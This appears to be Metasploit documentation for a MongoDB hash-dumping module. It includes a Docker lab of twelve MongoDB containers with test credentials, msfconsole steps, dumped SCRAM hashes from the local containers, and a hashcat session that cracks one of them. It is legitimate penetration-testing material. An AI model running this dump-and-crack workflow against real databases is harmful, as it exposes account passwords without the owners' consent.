## Vulnerable Application

This module extracts password hashes from a MongoDB instance and stores
them in the database for later cracking. By default, it dumps system user
credentials from the 'system.users' collection. Alternatively,
it can dump application user hashes from a specified collection.

Use Hashcat mode 24100 for SCRAM-SHA-1 and 24200 for SCRAM-SHA-256

Successfully tested against MongoDB 3.6.23, 4.4.30, 5.0.33, 6.0.28, 7.0.43, 8.3.11
with and without authentication

### Docker Compose Setup

#### init-mongo.js

Write this file to `init-mongo.js`

```
// Privileged user for hashdump testing (users are stored in admin on 3.0+)
db = db.getSiblingDB('admin');
db.createUser({
  user: "rootuser",
  pwd: "rootpass",
  roles: [ { role: "root", db: "admin" } ]
});

// Create a non-root read/write user for testing, plus sample data, in intranet
db = db.getSiblingDB('intranet');
db.createUser({
  user: "testuser",
  pwd: "testpass",
  roles: [
    { role: "readWrite", db: "intranet" }
  ]
});

// Create sample collection and documents
db.users.insertMany([
  { user: "admin", role: "administrator", email: "admin@corp.local" },
  { user: "jdoe", role: "developer", email: "jdoe@corp.local" }
]);

db.config.insertMany([
  { key: "site_name", value: "Internal Portal", note: "Production config" }
]);
```

#### docker-compose.yml

Starts all six MongoDB versions with and without authentication, so every
scenario below replays by changing only the port:

| Port  | Version | Authentication |
|-------|---------|----------------|
| 27017 | 3.6.23  | disabled       |
| 27018 | 4.4.30  | disabled       |
| 27019 | 5.0.33  | disabled       |
| 27020 | 6.0.28  | disabled       |
| 27021 | 7.0.43  | disabled       |
| 27022 | 8.3.11  | disabled       |
| 27023 | 3.6.23  | enabled        |
| 27024 | 4.4.30  | enabled        |
| 27025 | 5.0.33  | enabled        |
| 27026 | 6.0.28  | enabled        |
| 27027 | 7.0.43  | enabled        |
| 27028 | 8.3.11  | enabled        |

The authentication-enabled services create `admin`/`adminpassword` (root) plus
the init-mongo.js users: `rootuser`/`rootpass` (root role) and `testuser`/
`testpass` (readWrite on the `intranet` db, which also holds the sample data).

```yaml
# 27017-27022: authentication disabled; 27023-27028: authentication enabled
services:
  mongo-3.6:
    image: mongo:3.6
    container_name: mongo-3.6
    ports:
      - "27017:27017"
    volumes:
      - mongo_3_6_data:/data/db

  mongo-4.4:
    image: mongo:4.4.30
    container_name: mongo-4.4
    ports:
      - "27018:27017"
    volumes:
      - mongo_4_4_data:/data/db

  mongo-5.0:
    image: mongo:5.0.33
    container_name: mongo-5.0
    ports:
      - "27019:27017"
    volumes:
      - mongo_5_0_data:/data/db

  mongo-6.0:
    image: mongo:6.0.28
    container_name: mongo-6.0
    ports:
      - "27020:27017"
    volumes:
      - mongo_6_0_data:/data/db

  mongo-7.0:
    image: mongo:7.0.43
    container_name: mongo-7.0
    ports:
      - "27021:27017"
    volumes:
      - mongo_7_0_data:/data/db

  mongo-8.3:
    image: mongo:8.3.11
    container_name: mongo-8.3
    ports:
      - "27022:27017"
    volumes:
      - mongo_8_3_data:/data/db

  mongo-3.6-auth:
    image: mongo:3.6
    container_name: mongo-3.6-auth
    ports:
      - "27023:27017"
    environment:
      MONGO_INITDB_DATABASE: intranet
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: adminpassword
    volumes:
      - mongo_3_6_auth_data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro

  mongo-4.4-auth:
    image: mongo:4.4.30
    container_name: mongo-4.4-auth
    ports:
      - "27024:27017"
    environment:
      MONGO_INITDB_DATABASE: intranet
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: adminpassword
    volumes:
      - mongo_4_4_auth_data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro

  mongo-5.0-auth:
    image: mongo:5.0.33
    container_name: mongo-5.0-auth
    ports:
      - "27025:27017"
    environment:
      MONGO_INITDB_DATABASE: intranet
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: adminpassword
    volumes:
      - mongo_5_0_auth_data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro

  mongo-6.0-auth:
    image: mongo:6.0.28
    container_name: mongo-6.0-auth
    ports:
      - "27026:27017"
    environment:
      MONGO_INITDB_DATABASE: intranet
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: adminpassword
    volumes:
      - mongo_6_0_auth_data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro

  mongo-7.0-auth:
    image: mongo:7.0.43
    container_name: mongo-7.0-auth
    ports:
      - "27027:27017"
    environment:
      MONGO_INITDB_DATABASE: intranet
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: adminpassword
    volumes:
      - mongo_7_0_auth_data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro

  mongo-8.3-auth:
    image: mongo:8.3.11
    container_name: mongo-8.3-auth
    ports:
      - "27028:27017"
    environment:
      MONGO_INITDB_DATABASE: intranet
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: adminpassword
    volumes:
      - mongo_8_3_auth_data:/data/db
      - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro

volumes:
  mongo_3_6_data:
  mongo_4_4_data:
  mongo_5_0_data:
  mongo_6_0_data:
  mongo_7_0_data:
  mongo_8_3_data:
  mongo_3_6_auth_data:
  mongo_4_4_auth_data:
  mongo_5_0_auth_data:
  mongo_6_0_auth_data:
  mongo_7_0_auth_data:
  mongo_8_3_auth_data:
```

## Verification Steps

1. Install the application (`docker compose down -v && docker compose up -d`)
1. Start msfconsole
1. Do: `use auxiliary/scanner/mongodb/mongodb_hashdump`
1. Optionally Do: `set username <username>`
1. Optionally Do: `set password <password>`
1. Do: `set rhost [ip]`
1. Do: `run`
1. You should get a hash dump

## Options

### DB

Database to query. Defaults to `admin`

### COLLECTION

Custom collection to dump (if empty, dumps system.users). Defaults to ``.

### USER_FIELD

Username field name for custom collection. Defaults to `username`

### HASH_FIELD

Hash field name for custom collection. Defaults to `hash`

### USERNAME

Username for authentication if required. Defaults to ``.

### PASSWORD

Password for authentication if required. Defaults to ``.

## Scenarios

### MongoDB 3.6.23, 4.4.30, 5.0.33, 6.0.28, 7.0.43, 8.3.11 with and without Authentication

```
msf > use auxiliary/scanner/mongodb/mongodb_hashdump
msf auxiliary(scanner/mongodb/mongodb_hashdump) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27017
[*] 127.0.0.1:27017       - Negotiated wire protocol: OP_MSG
[+] 127.0.0.1:27017       - No authentication required
[*] 127.0.0.1:27017       - Dumping MongoDB system users from admin.system.users...
[!] 127.0.0.1:27017       - No users found or unable to parse
[*] 127.0.0.1:27017       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27018
[*] 127.0.0.1:27018       - Negotiated wire protocol: OP_MSG
[+] 127.0.0.1:27018       - No authentication required
[*] 127.0.0.1:27018       - Dumping MongoDB system users from admin.system.users...
[!] 127.0.0.1:27018       - No users found or unable to parse
[*] 127.0.0.1:27018       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27019
[*] 127.0.0.1:27019       - Negotiated wire protocol: OP_MSG
[+] 127.0.0.1:27019       - No authentication required
[*] 127.0.0.1:27019       - Dumping MongoDB system users from admin.system.users...
[!] 127.0.0.1:27019       - No users found or unable to parse
[*] 127.0.0.1:27019       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27020
[*] 127.0.0.1:27020       - Negotiated wire protocol: OP_MSG
[+] 127.0.0.1:27020       - No authentication required
[*] 127.0.0.1:27020       - Dumping MongoDB system users from admin.system.users...
[!] 127.0.0.1:27020       - No users found or unable to parse
[*] 127.0.0.1:27020       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27021
[*] 127.0.0.1:27021       - Negotiated wire protocol: OP_MSG
[+] 127.0.0.1:27021       - No authentication required
[*] 127.0.0.1:27021       - Dumping MongoDB system users from admin.system.users...
[!] 127.0.0.1:27021       - No users found or unable to parse
[*] 127.0.0.1:27021       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27022
[*] 127.0.0.1:27022       - Negotiated wire protocol: OP_MSG
[+] 127.0.0.1:27022       - No authentication required
[*] 127.0.0.1:27022       - Dumping MongoDB system users from admin.system.users...
[!] 127.0.0.1:27022       - No users found or unable to parse
[*] 127.0.0.1:27022       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27023 USERNAME=admin PASSWORD=adminpassword
[*] 127.0.0.1:27023       - Negotiated wire protocol: OP_MSG
[*] 127.0.0.1:27023       - Authentication required, attempting login as 'admin'...
[+] 127.0.0.1:27023       - Successfully authenticated via SCRAM-SHA-1
[*] 127.0.0.1:27023       - Dumping MongoDB system users from admin.system.users...
[+] 127.0.0.1:27023       - 
MongoDB System Hashes
=====================

Type              Username  Hash
----              --------  ----
db (SCRAM-SHA-1)  admin     $mongodb-scram$*0*YWRtaW4=*10000*2CXFCaxCfSNnc+6cDKfrcg==*6SBIlgTvILMd0prpj4qYPeRfXZE=
db (SCRAM-SHA-1)  rootuser  $mongodb-scram$*0*cm9vdHVzZXI=*10000*SKfUQgY9YMkxt/zBdOvWgA==*axuYOXSIZvBuNRmFaFyVhN14YYc=
db (SCRAM-SHA-1)  testuser  $mongodb-scram$*0*dGVzdHVzZXI=*10000*jjMPcMI0qtwojYnMmFxfzg==*0ri4CX+V7fXZgDxGfI/4sv8BIN4=

[*] 127.0.0.1:27023       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27024 USERNAME=admin PASSWORD=adminpassword
[*] 127.0.0.1:27024       - Negotiated wire protocol: OP_MSG
[*] 127.0.0.1:27024       - Authentication required, attempting login as 'admin'...
[+] 127.0.0.1:27024       - Successfully authenticated via SCRAM-SHA-1
[*] 127.0.0.1:27024       - Dumping MongoDB system users from admin.system.users...
[+] 127.0.0.1:27024       - 
MongoDB System Hashes
=====================

Type                Username  Hash
----                --------  ----
db (SCRAM-SHA-1)    admin     $mongodb-scram$*0*YWRtaW4=*10000*SoDDdqCVRM6Umn7zB5WHlg==*LG7IbhKz9Yg+y9DWdfByMsEviuA=
db (SCRAM-SHA-1)    rootuser  $mongodb-scram$*0*cm9vdHVzZXI=*10000*BY34wlTqoCVPcKgJ/wt3uw==*8mHHakMTxIoYOlqP9QEwAbadwtY=
db (SCRAM-SHA-1)    testuser  $mongodb-scram$*0*dGVzdHVzZXI=*10000*1ABOgCatUTksetbYjvd9lg==*jIuckhqSc8exYLa7DgTtas7qg7Y=
db (SCRAM-SHA-256)  admin     $mongodb-scram$*1*YWRtaW4=*15000*/mqsbNNC6RtOGxBHj18RgrVR0OuwAQ36rlFYZw==*G6WWFFA5AKa+CC7ikmKRxpsOLgJN3L/5gNJU+90jzWM=
db (SCRAM-SHA-256)  rootuser  $mongodb-scram$*1*cm9vdHVzZXI=*15000*kdUltpZtp5dcrBMiNrl3aeStRt8CVfEJNvLZuA==*sRCIFgakbZjcMUvIiq38i8wcFol78fsjWIS07m3nleU=
db (SCRAM-SHA-256)  testuser  $mongodb-scram$*1*dGVzdHVzZXI=*15000*0o/YJAzgubCAVMu+FqucfEy7NAVjSkOhPRwsdw==*gIEfozIw6ItNSvihV0dwJR8BylbjFr9zsCOq9cqjSiA=

[*] 127.0.0.1:27024       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27025 USERNAME=admin PASSWORD=adminpassword
[*] 127.0.0.1:27025       - Negotiated wire protocol: OP_MSG
[*] 127.0.0.1:27025       - Authentication required, attempting login as 'admin'...
[+] 127.0.0.1:27025       - Successfully authenticated via SCRAM-SHA-1
[*] 127.0.0.1:27025       - Dumping MongoDB system users from admin.system.users...
[+] 127.0.0.1:27025       - 
MongoDB System Hashes
=====================

Type                Username  Hash
----                --------  ----
db (SCRAM-SHA-1)    admin     $mongodb-scram$*0*YWRtaW4=*10000*oZp1DIQvGx6XiKEBXaZ0wQ==*Uy8w43qcMVQwWnmlQhyWoPqcmx0=
db (SCRAM-SHA-1)    rootuser  $mongodb-scram$*0*cm9vdHVzZXI=*10000*ISBeCj0FtlsKvS+ck5sWTw==*ngdqLNXYQ8tCWg2dGQY1sEDTaBA=
db (SCRAM-SHA-1)    testuser  $mongodb-scram$*0*dGVzdHVzZXI=*10000*5yoop0qA6zd0saJzxhi6aQ==*dtWHB4Q+/VxWYZ4Q4oXePN6vp5o=
db (SCRAM-SHA-256)  admin     $mongodb-scram$*1*YWRtaW4=*15000*kPN0SK823ngOTgSUuy1Ci6OvIR2tcVVITKsmGw==*+cpmtULejKWjE1LHiqtbMBCpGZkLSQtIxaNsMO4LiH8=
db (SCRAM-SHA-256)  rootuser  $mongodb-scram$*1*cm9vdHVzZXI=*15000*Eep26WwJGZ3V57OFTVEoilBs1y6MHytnVLH/wA==*QRwVv6wzrq9f6AbZA9LNbApX+NAP5NQuZIHLrjsHccE=
db (SCRAM-SHA-256)  testuser  $mongodb-scram$*1*dGVzdHVzZXI=*15000*cjtQOftDLA3hmp/AQIzpMwEZiuiOqrA3yX7gvg==*84L0roD9Kk3XshoymiTSFJ3N7vz7/Toqc8fJ18crHfg=

[*] 127.0.0.1:27025       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27026 USERNAME=admin PASSWORD=adminpassword
[*] 127.0.0.1:27026       - Negotiated wire protocol: OP_MSG
[*] 127.0.0.1:27026       - Authentication required, attempting login as 'admin'...
[+] 127.0.0.1:27026       - Successfully authenticated via SCRAM-SHA-1
[*] 127.0.0.1:27026       - Dumping MongoDB system users from admin.system.users...
[+] 127.0.0.1:27026       - 
MongoDB System Hashes
=====================

Type                Username  Hash
----                --------  ----
db (SCRAM-SHA-1)    admin     $mongodb-scram$*0*YWRtaW4=*10000*xxPHoiyD4nGVaWkyEIu9aA==*doIRWG05FqCZnUhfYL1vXaxiX+M=
db (SCRAM-SHA-1)    rootuser  $mongodb-scram$*0*cm9vdHVzZXI=*10000*0C7FTqPDFgx5Sf/wemlAJg==*Cyikz+p8zuOX6Lx66aViJysTUUk=
db (SCRAM-SHA-1)    testuser  $mongodb-scram$*0*dGVzdHVzZXI=*10000*x+vGYsfHn39HF72b4mVCQQ==*8t6sksI5J3XrZL5z63555tt/Yqs=
db (SCRAM-SHA-256)  admin     $mongodb-scram$*1*YWRtaW4=*15000*Bt8RpsStRg6v7HxzCwIj5WnLSYMduTJV8TYATg==*1VEGK68/Bjjmi7QFYzQ2Ya0U9bnQ7D5UriMKpHwoalM=
db (SCRAM-SHA-256)  rootuser  $mongodb-scram$*1*cm9vdHVzZXI=*15000*DuTFacIqn9sEetyl9ehDhrHzGCCjKrgZKQIdRQ==*FhVnn9/Y/OwqHvZpzY4/o3UEQDSZeMZ9FdE86pVopGo=
db (SCRAM-SHA-256)  testuser  $mongodb-scram$*1*dGVzdHVzZXI=*15000*uQvF04Pe4xTkrGmMGAyn9Fz/92APX/bAufDw4g==*uSShmORz5iptQCAWg55f1T1rrIFXa4FKgvfBJpvvWw0=

[*] 127.0.0.1:27026       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27027 USERNAME=admin PASSWORD=adminpassword
[*] 127.0.0.1:27027       - Negotiated wire protocol: OP_MSG
[*] 127.0.0.1:27027       - Authentication required, attempting login as 'admin'...
[+] 127.0.0.1:27027       - Successfully authenticated via SCRAM-SHA-1
[*] 127.0.0.1:27027       - Dumping MongoDB system users from admin.system.users...
[+] 127.0.0.1:27027       - 
MongoDB System Hashes
=====================

Type                Username  Hash
----                --------  ----
db (SCRAM-SHA-1)    admin     $mongodb-scram$*0*YWRtaW4=*10000*trd38JMBhnJKEffONhG5OQ==*ji8zzNUka4jG8xsYBaPPdOaNqYY=
db (SCRAM-SHA-1)    rootuser  $mongodb-scram$*0*cm9vdHVzZXI=*10000*nXlHH5ydAL26C0N/VLhxMQ==*eAy7qUhDfHfchmqJr/l8PDDMP4M=
db (SCRAM-SHA-1)    testuser  $mongodb-scram$*0*dGVzdHVzZXI=*10000*bBSKGYKhWdco0OsNLdFCNw==*+GJqb3UCI0prEp38Ba8ucHkIck0=
db (SCRAM-SHA-256)  admin     $mongodb-scram$*1*YWRtaW4=*15000*+5oyaXJQts/VuU/MO9ixuXzU5ct8r8A0PEAI1Q==*fuc8+pDUyY0Te2AJ73IdfKJiQJXG7TgL4E2d2e5GNd4=
db (SCRAM-SHA-256)  rootuser  $mongodb-scram$*1*cm9vdHVzZXI=*15000*aGYFFPKEX6PnYVaj3Qub4/Tvkk/W3+Lj6arkng==*UwDQjcdinhMEhDhf0EJYErgm6KTIPgH2KCAxuZq29bU=
db (SCRAM-SHA-256)  testuser  $mongodb-scram$*1*dGVzdHVzZXI=*15000*cAdHOn7RcazGlbvmNdj5M/d5s747mkglPbXv3A==*qMjuQuGQnBxZ5eNeu5dXJVxuBhvN9GROLNNtcNSJL8g=

[*] 127.0.0.1:27027       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mongodb/mongodb_hashdump) > run RPORT=27028 USERNAME=admin PASSWORD=adminpassword
[*] 127.0.0.1:27028       - Negotiated wire protocol: OP_MSG
[*] 127.0.0.1:27028       - Authentication required, attempting login as 'admin'...
[+] 127.0.0.1:27028       - Successfully authenticated via SCRAM-SHA-1
[*] 127.0.0.1:27028       - Dumping MongoDB system users from admin.system.users...
[+] 127.0.0.1:27028       - 
MongoDB System Hashes
=====================

Type                Username  Hash
----                --------  ----
db (SCRAM-SHA-1)    admin     $mongodb-scram$*0*YWRtaW4=*10000*BnzsUk3JnjgdWcsU9I/blg==*wAAI/MFnQj33bKtZ8/ho5QVH8eg=
db (SCRAM-SHA-1)    rootuser  $mongodb-scram$*0*cm9vdHVzZXI=*10000*OhCTlX1+njPtVvOOb3K/8g==*umeu40ky7BLFe8p58GHtsvjsxYs=
db (SCRAM-SHA-1)    testuser  $mongodb-scram$*0*dGVzdHVzZXI=*10000*dSS1TdbbkeIyVhxbm/AMeg==*d/7wNxZUcA8+W3N4s+8zMFav+Yg=
db (SCRAM-SHA-256)  admin     $mongodb-scram$*1*YWRtaW4=*15000*G327K3PNCYZx2t+tVLgXsqGhh/LypJ86MgpuFg==*JXV/mj4hSdtqbcGNM+MK1jIlfjHKjwBIhf+KuBEMl0s=
db (SCRAM-SHA-256)  rootuser  $mongodb-scram$*1*cm9vdHVzZXI=*15000*54zJMOufXHwXn6vJU3ov4xfquUygenUNPHCNdA==*BDPTKZRB4C2yOo3u8H6WCiDSGHs7i9irdq19nJ8p7Z4=
db (SCRAM-SHA-256)  testuser  $mongodb-scram$*1*dGVzdHVzZXI=*15000*tzjM1+5q7hxwTrbmkbFgt1JY/nT2qcpuztDejw==*tnjXYYtDZZicZNqZcvYIbZHFlSO6VXYKAm0aYolYdzI=

[*] 127.0.0.1:27028       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Cracking

```
$ hashcat /tmp/hashes.txt -m 24100 -a 0 /tmp/wordlist --potfile-disable
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-ivybridge-Intel(R) Xeon(R) CPU E5-2650 v2 @ 2.60GHz, 39240/78480 MB (16384 MB allocatable), 12MCU

...clip...

Approaching final keyspace - workload adjusted.           

$mongodb-scram$*0*YWRtaW4=*10000*xCc57N/8IgpWEHPODdHsAQ==*+bxIK/YAwBSxMLnRpPf4AmbSBvQ=:adminpassword
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 24100 (MongoDB ServerKey SCRAM-SHA-1)
Hash.Target......: $mongodb-scram$*0*YWRtaW4=*10000*1kvLnsfbYpJe0HcO/W...u9c4g=
Time.Started.....: Fri Aug 14 14:31:45 2026 (0 secs)
Time.Estimated...: Fri Aug 14 14:31:45 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/tmp/wordlist)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      225 H/s (0.86ms) @ Accel:87 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3/3 (100.00%)
Rejected.........: 0/3 (0.00%)
Restore.Point....: 0/3 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:9000-9999
Candidate.Engine.: Device Generator
Candidates.#01...: admin -> password
Hardware.Mon.#01.: Util: 20%

Started: Fri Aug 14 14:31:42 2026
Stopped: Fri Aug 14 14:31:47 2026
```
